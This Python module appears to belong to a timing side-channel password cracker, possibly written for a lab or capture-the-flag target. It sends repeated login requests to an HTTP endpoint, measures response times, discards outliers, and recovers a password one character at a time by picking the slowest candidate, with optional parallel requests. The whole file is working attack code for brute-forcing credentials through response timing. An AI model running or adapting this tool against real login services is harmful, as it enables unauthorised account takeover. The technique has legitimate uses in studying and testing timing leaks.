"""
Timing and Analysis: Measurement collection, statistical analysis, and utilities.
Consolidates timing_service.py, analysis_service.py, and stats.py.
"""

import statistics
from typing import List, Dict, Tuple
from dataclasses import dataclass
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import numpy as np
from scipy import stats as scipy_stats

from http_client import HttpClient, TimingMeasurement
from utils import Logger, InsufficientDataException


# ============================================
# DATA CLASSES
# ============================================

@dataclass
class SamplingStrategy:
    """Configuration for adaptive sampling based on position."""
    initial_samples: int = 10
    middle_samples: int = 8
    final_samples: int = 5
    min_samples: int = 3


@dataclass
class CharacterAnalysis:
    """Statistical analysis result for a character candidate."""
    character: str
    median_time: float
    mean_time: float
    std_dev: float
    confidence_score: float
    sample_count: int


# ============================================
# STATISTICAL UTILITY FUNCTIONS
# ============================================

def remove_outliers(data: List[float], std_dev_threshold: float = 3.0) -> List[float]:
    """Remove outliers using Z-score method."""
    if len(data) < 3:
        return data

    mean = statistics.mean(data)
    std_dev = statistics.stdev(data)

    if std_dev == 0:
        return data

    return [x for x in data if abs((x - mean) / std_dev) <= std_dev_threshold]


def calculate_confidence_interval(
    data: List[float],
    confidence: float = 0.95
) -> Tuple[float, float]:
    """Calculate confidence interval for the mean using t-distribution."""
    if len(data) < 2:
        return (0.0, 0.0)

    n = len(data)
    mean = np.mean(data)
    std_err = scipy_stats.sem(data)
    t_value = scipy_stats.t.ppf((1 + confidence) / 2, n - 1)
    margin_of_error = t_value * std_err

    return (mean - margin_of_error, mean + margin_of_error)


def is_significantly_different(
    data1: List[float],
    data2: List[float],
    alpha: float = 0.05
) -> Tuple[bool, float]:
    """Test if two datasets are significantly different using Welch's t-test."""
    if len(data1) < 2 or len(data2) < 2:
        return False, 1.0

    statistic, p_value = scipy_stats.ttest_ind(data1, data2, equal_var=False)
    return p_value < alpha, p_value


# ============================================
# TIMING SERVICE
# ============================================

class TimingService:
    """
    Service for collecting timing measurements with adaptive sampling.
    Supports both sequential and parallel execution.
    """

    def __init__(
        self,
        http_client: HttpClient,
        sampling_strategy: SamplingStrategy,
        logger: Logger,
        use_parallel: bool = False,
        max_workers: int = 5
    ):
        self.http_client = http_client
        self.strategy = sampling_strategy
        self.logger = logger
        self.use_parallel = use_parallel
        self.max_workers = max_workers
        self._lock = threading.Lock()

    def _get_sample_count(self, position: int) -> int:
        """Determine number of samples based on position (adaptive sampling)."""
        if position < 3:
            return self.strategy.initial_samples
        elif position < 8:
            return self.strategy.middle_samples
        else:
            return self.strategy.final_samples

    def measure_candidate(
        self,
        password: str,
        username: str,
        difficulty: int,
        position: int
    ) -> List[TimingMeasurement]:
        """Collect multiple timing measurements for a password candidate."""
        num_samples = self._get_sample_count(position)
        measurements: List[TimingMeasurement] = []

        self.logger.debug(
            f"Measuring '{password}' with {num_samples} samples (position {position})"
        )

        for sample_num in range(num_samples):
            measurement = self.http_client.send_request(
                password, username, difficulty
            )

            # Early exit if correct password found
            if measurement.is_correct:
                self.logger.info(f"[+] Correct password found: {password}")
                return [measurement]

            # Only keep successful measurements
            if measurement.success:
                measurements.append(measurement)

        # Validate we have enough data
        if len(measurements) < self.strategy.min_samples:
            raise InsufficientDataException(
                samples_collected=len(measurements),
                samples_required=self.strategy.min_samples
            )

        self.logger.debug(
            f"Collected {len(measurements)}/{num_samples} valid samples"
        )

        return measurements

    def measure_all_candidates(
        self,
        current_password: str,
        charset: str,
        username: str,
        difficulty: int,
        position: int,
        password_length: int = None
    ) -> Dict[str, List[TimingMeasurement]]:
        """Measure timing for all possible next characters."""
        if self.use_parallel:
            return self._measure_all_candidates_parallel(
                current_password, charset, username, difficulty, position, password_length
            )
        else:
            return self._measure_all_candidates_sequential(
                current_password, charset, username, difficulty, position, password_length
            )

    def _measure_all_candidates_sequential(
        self,
        current_password: str,
        charset: str,
        username: str,
        difficulty: int,
        position: int,
        password_length: int = None
    ) -> Dict[str, List[TimingMeasurement]]:
        """Sequential measurement of all candidates."""
        results: Dict[str, List[TimingMeasurement]] = {}

        self.logger.info(f"Testing position {position} ({len(charset)} candidates) [SEQUENTIAL]")

        for char in charset:
            candidate = current_password + char

            # Pad to known password length if provided
            if password_length is not None and len(candidate) < password_length:
                padding_char = charset[0]
                padding_needed = password_length - len(candidate)
                candidate = candidate + (padding_char * padding_needed)

            try:
                measurements = self.measure_candidate(
                    candidate, username, difficulty, position
                )

                # Check if we found the complete password
                if measurements and measurements[0].is_correct:
                    self.logger.info(f"[+] Complete password found: {candidate}")
                    return {char: measurements}

                results[char] = measurements

            except InsufficientDataException as e:
                self.logger.warning(
                    f"Skipping '{char}': {e.samples_collected} samples "
                    f"(need {e.samples_required})"
                )
                results[char] = []

        return results

    def _measure_all_candidates_parallel(
        self,
        current_password: str,
        charset: str,
        username: str,
        difficulty: int,
        position: int,
        password_length: int = None
    ) -> Dict[str, List[TimingMeasurement]]:
        """Parallel measurement of all candidates using ThreadPoolExecutor."""
        results: Dict[str, List[TimingMeasurement]] = {}

        self.logger.info(
            f"Testing position {position} ({len(charset)} candidates) "
            f"[PARALLEL - {self.max_workers} workers]"
        )

        def measure_char(char: str):
            """Measure a single character candidate."""
            candidate = current_password + char

            # Pad to known password length if provided
            if password_length is not None and len(candidate) < password_length:
                padding_char = charset[0]
                padding_needed = password_length - len(candidate)
                candidate = candidate + (padding_char * padding_needed)

            try:
                measurements = self.measure_candidate(
                    candidate, username, difficulty, position
                )
                return char, measurements, None
            except InsufficientDataException as e:
                return char, [], e

        # Use ThreadPoolExecutor for parallel execution
        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:
            # Submit all tasks
            future_to_char = {
                executor.submit(measure_char, char): char
                for char in charset
            }

            # Collect results as they complete
            for future in as_completed(future_to_char):
                char = future_to_char[future]
                try:
                    char, measurements, error = future.result()

                    if error:
                        with self._lock:
                            self.logger.warning(
                                f"Skipping '{char}': {error.samples_collected} samples "
                                f"(need {error.samples_required})"
                            )
                        results[char] = []
                    else:
                        # Check if we found the complete password
                        if measurements and measurements[0].is_correct:
                            with self._lock:
                                self.logger.info(f"[+] Complete password found!")
                            # Cancel remaining futures
                            for f in future_to_char:
                                f.cancel()
                            return {char: measurements}

                        results[char] = measurements

                except Exception as e:
                    with self._lock:
                        self.logger.error(f"Error measuring '{char}': {str(e)}")
                    results[char] = []

        return results


# ============================================
# ANALYSIS SERVICE
# ============================================

class AnalysisService:
    """Statistical analysis of timing measurements."""

    def __init__(
        self,
        confidence_level: float = 0.95,
        min_time_difference: float = 0.001,
        outlier_threshold: float = 3.0,
        logger: Logger = None
    ):
        self.confidence_level = confidence_level
        self.min_time_difference = min_time_difference
        self.outlier_threshold = outlier_threshold
        self.logger = logger or Logger()

    def analyze_measurements(
        self,
        measurements: List[TimingMeasurement]
    ) -> CharacterAnalysis:
        """Analyze timing measurements for a single character."""
        if not measurements:
            return CharacterAnalysis(
                character="",
                median_time=0.0,
                mean_time=0.0,
                std_dev=0.0,
                confidence_score=0.0,
                sample_count=0
            )

        # Extract timing data
        times = [m.elapsed_time for m in measurements]

        # Remove outliers
        cleaned_times = remove_outliers(times, self.outlier_threshold)

        if not cleaned_times:
            cleaned_times = times

        # Calculate statistics
        median_time = statistics.median(cleaned_times)
        mean_time = statistics.mean(cleaned_times)
        std_dev = statistics.stdev(cleaned_times) if len(cleaned_times) > 1 else 0.0

        # Calculate confidence score
        confidence_score = self._calculate_confidence(cleaned_times)

        return CharacterAnalysis(
            character=measurements[0].password[-1] if measurements[0].password else "",
            median_time=median_time,
            mean_time=mean_time,
            std_dev=std_dev,
            confidence_score=confidence_score,
            sample_count=len(measurements)
        )

    def _calculate_confidence(self, times: List[float]) -> float:
        """Calculate confidence score based on sample consistency."""
        if len(times) < 2:
            return 0.5

        # Use coefficient of variation (CV) as confidence metric
        mean = statistics.mean(times)
        std_dev = statistics.stdev(times)

        if mean == 0:
            return 0.0

        cv = std_dev / mean

        # Lower CV = higher confidence (invert and normalize)
        confidence = 1.0 / (1.0 + cv)

        return min(max(confidence, 0.0), 1.0)

    def compare_candidates(
        self,
        analyses: List[CharacterAnalysis]
    ) -> Tuple[str, float]:
        """Compare all candidates and select the best one."""
        if not analyses:
            return None, 0.0

        # Sort by median time (descending - slower is better)
        sorted_analyses = sorted(
            analyses,
            key=lambda a: a.median_time,
            reverse=True
        )

        best = sorted_analyses[0]
        second_best = sorted_analyses[1] if len(sorted_analyses) > 1 else None

        # Log top candidate
        self.logger.info(
            f"Top candidate: '{best.character}' "
            f"({best.median_time:.6f}s, conf={best.confidence_score:.3f})"
        )

        if second_best:
            time_diff = best.median_time - second_best.median_time
            self.logger.info(
                f"Runner-up: '{second_best.character}' "
                f"({second_best.median_time:.6f}s, diff={time_diff:.6f}s)"
            )

            # Warn if difference is small
            if time_diff < self.min_time_difference:
                self.logger.warning(
                    f"Small timing difference ({time_diff:.6f}s), "
                    "result may be unreliable"
                )

        return best.character, best.confidence_score
